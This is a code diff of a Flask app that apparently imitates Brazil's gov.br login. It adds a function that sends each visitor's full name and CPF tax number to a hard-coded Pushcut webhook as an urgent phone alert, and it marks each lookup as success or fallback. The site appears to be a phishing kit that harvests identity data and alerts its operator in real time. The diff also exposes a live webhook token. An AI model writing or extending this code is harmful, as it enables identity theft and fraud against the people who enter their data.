@@ -47,6 +47,39 @@ def register_routes(app):
         """Página de login gov.br"""
         return render_template('login.html')
 
+    def _send_pushcut_cpf_notification(cpf_data: dict, consultation_result: dict) -> None:
+        """Send notification to Pushcut webhook when CPF is consulted"""
+        try:
+            pushcut_webhook_url = "https://api.pushcut.io/CwRJR0BYsyJYezzN-no_e/notifications/Sms"
+            
+            # Preparar dados da notificação
+            customer_name = consultation_result.get('nome_completo', 'Cliente')
+            cpf = cpf_data.get('cpf', 'N/A')
+            success = consultation_result.get('success', False)
+            
+            notification_payload = {
+                "title": "📋 Nova Consulta CPF",
+                "text": f"Cliente: {customer_name}\nCPF: {cpf}\nStatus: {'Sucesso' if success else 'Fallback'}",
+                "isTimeSensitive": True
+            }
+            
+            print(f"[CPF] Enviando notificação Pushcut: {notification_payload}")
+            
+            # Enviar notificação
+            response = requests.post(
+                pushcut_webhook_url,
+                json=notification_payload,
+                timeout=10
+            )
+            
+            if response.ok:
+                print("[CPF] Notificação Pushcut enviada com sucesso!")
+            else:
+                print(f"[CPF] Falha ao enviar notificação Pushcut: {response.status_code}")
+                
+        except Exception as e:
+            print(f"[CPF] Erro ao enviar notificação Pushcut: {str(e)}")
+
     @app.route('/api/validate-cpf', methods=['POST'])
     def validate_cpf():
         """API para validar CPF usando CPFConsultationClient"""
@@ -72,7 +105,8 @@ def register_routes(app):
                     'rg': '12.345.678-9',
                     'naturalidade': 'São Paulo - SP',
                     'sexo': 'Masculino',
-                    'estado_civil': 'Casado(a)'
+                    'estado_civil': 'Casado(a)',
+                    'success': False
                 }
                 print(f"[CPF API] Fallback usado - Erro: {cpf_result.get('message')}")
             else:
@@ -86,9 +120,13 @@ def register_routes(app):
                     'rg': '12.345.678-9',
                     'naturalidade': 'São Paulo - SP',
                     'sexo': 'Masculino' if api_data.get('sexo') == 'M' else 'Feminino',
-                    'estado_civil': 'Casado(a)'
+                    'estado_civil': 'Casado(a)',
+                    'success': True
                 }
                 print(f"[CPF API] Dados obtidos: {api_data.get('nome')}")
+            
+            # Enviar notificação via Pushcut webhook
+            _send_pushcut_cpf_notification(data, user_data)
             
             session['user_data'] = user_data
             return jsonify({'success': True, 'data': user_data})
